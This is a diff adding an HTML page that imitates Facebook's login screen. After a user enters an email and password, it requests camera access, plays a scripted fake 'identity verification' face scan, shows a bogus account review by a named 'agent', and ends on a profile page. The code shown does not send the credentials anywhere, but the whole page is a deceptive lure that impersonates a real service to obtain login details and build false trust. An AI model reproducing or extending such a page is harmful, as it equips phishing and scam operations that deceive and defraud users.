@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Profile Page</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Segoe UI,sans-serif;}
+body{background:#f0f2f5;color:#1c1e21;}
+.hidden{display:none !important;}
+
+/* === LOGIN SCREEN === */
+.login-screen{display:block;text-align:center;margin-top:120px;padding:20px;}
+.fb-logo{font-size:60px;color:#1877f2;font-weight:bold;margin-bottom:16px;}
+.login-screen h2{font-size:24px;margin-bottom:24px;color:#1c1e21;}
+.input-field{width:100%;max-width:360px;padding:14px 16px;margin:8px auto;border:1px solid #dddfe2;border-radius:6px;font-size:17px;display:block;}
+.login-btn{width:100%;max-width:360px;padding:14px;background:#1877f2;color:#ffffff;border:none;border-radius:6px;font-size:17px;font-weight:600;cursor:pointer;margin-top:12px;}
+.login-btn:hover{background:#166fe5;}
+
+/* === FACE SCAN SCREEN === */
+.face-scan-screen{position:fixed;top:0;left:0;width:100%;height:100%;background:#ffffff;z-index:1000;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;text-align:center;}
+.scan-circle{width:260px;height:260px;border-radius:50%;border:3px solid #1877f2;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden;margin-bottom:24px;background:#000;}
+.scan-circle video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1);}
+.scan-line{position:absolute;width:100%;height:4px;background:linear-gradient(transparent, #1877f2, transparent);animation:scan 2s ease-in-out infinite;z-index:10;}
+@keyframes scan{0%{top:0;}50%{top:calc(100% - 4px);}100%{top:0;}}
+.face-scan-screen h2{font-size:22px;font-weight:600;color:#1c1e21;margin-bottom:8px;}
+.face-scan-screen p{font-size:16px;color:#65676b;margin-bottom:6px;}
+.scan-status{color:#1877f2;font-weight:600;margin-top:12px;font-size:18px;}
+
+/* === LOADING SCREEN === */
+.loading-screen{position:fixed;top:0;left:0;width:100%;height:100%;background:#ffffff;z-index:1001;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;text-align:center;}
+.loading-spinner{width:70px;height:70px;border:4px solid #e0e0e0;border-top-color:#1877f2;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:24px;}
+@keyframes spin{to{transform:rotate(360deg);}}
+.loading-screen h2{font-size:22px;font-weight:600;color:#1c1e21;margin-bottom:8px;}
+.loading-screen p{font-size:16px;color:#65676b;margin-bottom:6px;}
+.loading-time{font-size:16px;font-weight:600;color:#1877f2;margin-top:8px;}
+
+/* === PROFILE PAGE === */
+.cover-container{width:100%;height:300px;background:#dddfe2;position:relative;overflow:hidden;}
+.cover-photo{width:100%;height:100%;object-fit:cover;}
+
+.share-note{position:absolute;bottom:10px;left:10px;background:rgba(255,255,255,0.95);color:#1c1e21;padding:5px 12px;border-radius:20px;font-size:13px;box-shadow:0 1px 3px rgba(0,0,0,0.12);font-weight:500;}
+
+.camera-btn-cover{position:absolute;bottom:10px;right:10px;background:rgba(255,255,255,0.95);border:none;border-radius:50%;width:32px;height:32px;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 1px 3px rgba(0,0,0,0.12);}
+.camera-btn-cover svg{width:18px;height:18px;fill:#65676b;}
+
+.profile-section{background:#ffffff;padding:0 16px 24px;position:relative;}
+.profile-header{display:flex;align-items:flex-end;gap:12px;margin-bottom:20px;position:relative;}
+.profile-pic-wrap{position:relative;margin-top:-40px;z-index:5;}
+.profile-pic{width:110px;height:110px;border-radius:50%;border:4px solid #ffffff;object-fit:cover;background:#dddfe2;box-shadow:0 1px 3px rgba(0,0,0,0.12);}
+
+.profile-info{padding-bottom:8px;}
+.profile-name{font-size:24px;font-weight:700;color:#1c1e21;line-height:1.2;}
+
+/* ===== BUTTONS ===== */
+.button-row{display:flex;gap:10px;margin:16px 0;}
+.btn-dashboard, .btn-create{
+  padding:8px 16px;
+  border:none;
+  border-radius:6px;
+  font-size:14px;
+  font-weight:600;
+  cursor:pointer;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:6px;
+}
+.btn-dashboard{background:#0081FB;color:#fff;}
+.btn-dashboard:hover{background:#006edb;}
+.btn-dashboard svg{width:16px;height:16px;fill:white;}
+.btn-create{background:#e4e6eb;color:#1c1e21;}
+.btn-create:hover{background:#d8dadf;}
+.btn-create svg{width:18px;height:18px;fill:#1c1e21;}
+</style>
+</head>
+<body>
+
+<script>
+const CONFIG = {
+  coverPhotoLink: "https://i.imgur.com/XXXXXXXXXXXX.jpg",
+  profilePhotoLink: "https://i.imgur.com/2U1hpLA.jpeg"
+};
+</script>
+
+<div id="loginScreen" class="login-screen">
+  <div class="fb-logo">f</div>
+  <h2>Log In</h2>
+  <input type="email" id="emailInput" class="input-field" placeholder="Email address or phone number">
+  <input type="password" id="passwordInput" class="input-field" placeholder="Password">
+  <button id="loginButton" class="login-btn">Log In</button>
+</div>
+
+<div id="faceScanScreen" class="face-scan-screen hidden">
+  <div class="scan-circle">
+    <video id="cameraFeed" autoplay playsinline muted></video>
+    <div class="scan-line"></div>
+  </div>
+  <h2>Verifying your identity</h2>
+  <p>Position your face inside the circle</p>
+  <p class="scan-status" id="scanStatus">Initializing camera...</p>
+</div>
+
+<div id="loadingScreen" class="loading-screen hidden">
+  <div class="loading-spinner"></div>
+  <h2>We are reviewing your account</h2>
+  <p>Agent Rex Hernandez is processing your account</p>
+  <p class="loading-time">Estimated review time: Approximately 1 hour</p>
+</div>
+
+<div id="profilePage" class="hidden">
+  <!-- COVER PHOTO -->
+  <div class="cover-container">
+    <img class="cover-photo" id="coverImg" src="" alt="Cover Photo">
+    <div class="share-note">+ Add to story</div>
+    <button class="camera-btn-cover">
+      <svg viewBox="0 0 24 24"><path d="M12 15.2c1.77 0 3.2-1.43 3.2-3.2S13.77 8.8 12 8.8 8.8 10.23 8.8 12s1.43 3.2 3.2 3.2zM9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9z"/></svg>
+    </button>
+  </div>
+
+  <div class="profile-section">
+    <!-- PROFILE PIC + NAME -->
+    <div class="profile-header">
+      <div class="profile-pic-wrap">
+        <img class="profile-pic" id="profileImg" src="" alt="Profile Photo">
+      </div>
+      <div class="profile-info">
+        <h1 class="profile-name">Julius Flores</h1>
+      </div>
+    </div>
+
+    <!-- DASHBOARD + CREATE BUTTONS -->
+    <div class="button-row">
+      <button class="btn-dashboard">
+        <svg viewBox="0 0 24 24"><path d="M3 13h2v-2H3v2zm0 4h2v-2H3v2zm0-8h2V7H3v2zm4 4h14v-2H7v2zm0 4h14v-2H7v2zm0-8v2h14V9H7z"/></svg>
+        Dashboard
+      </button>
+      <button class="btn-create">
+        <svg viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
+        Create
+      </button>
+    </div>
+  </div>
+</div>
+
+<script>
+document.getElementById('coverImg').src = CONFIG.coverPhotoLink;
+document.getElementById('profileImg').src = CONFIG.profilePhotoLink;
+
+const loginScreen = document.getElementById('loginScreen');
+const faceScanScreen = document.getElementById('faceScanScreen');
+const loadingScreen = document.getElementById('loadingScreen');
+const profilePage = document.getElementById('profilePage');
+const loginButton = document.getElementById('loginButton');
+const scanStatus = document.getElementById('scanStatus');
+const cameraFeed = document.getElementById('cameraFeed');
+
+loginButton.addEventListener('click', function(){
+  const email = document.getElementById('emailInput').value.trim();
+  const pass = document.getElementById('passwordInput').value.trim();
+  
+  if(email && pass){
+    loginScreen.classList.add('hidden');
+    faceScanScreen.classList.remove('hidden');
+    
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    .then(function(stream) {
+      cameraFeed.srcObject = stream;
+      scanStatus.textContent = "Camera ready. Scanning...";
+      
+      setTimeout(function() { scanStatus.textContent = "Face detected ✓"; }, 1500);
+      setTimeout(function() { scanStatus.textContent = "Verifying..."; }, 2500);
+      setTimeout(function() { scanStatus.textContent = "Verified ✓"; }, 3500);
+      
+      setTimeout(function() {
+        if(cameraFeed.srcObject) {
+          cameraFeed.srcObject.getTracks().forEach(function(track) { track.stop(); });
+        }
+        faceScanScreen.classList.add('hidden');
+        loadingScreen.classList.remove('hidden');
+      }, 4500);
+      
+      setTimeout(function() {
+        loadingScreen.classList.add('hidden');
+        profilePage.classList.remove('hidden');
+      }, 6500);
+    })
+    .catch(function(err) {
+      scanStatus.textContent = "Please ALLOW camera access";
+      console.log('Camera error:', err);
+    });
+  } else {
+    alert('Please enter both email and password');
+  }
+});
+</script>
+
+</body>
+</html>
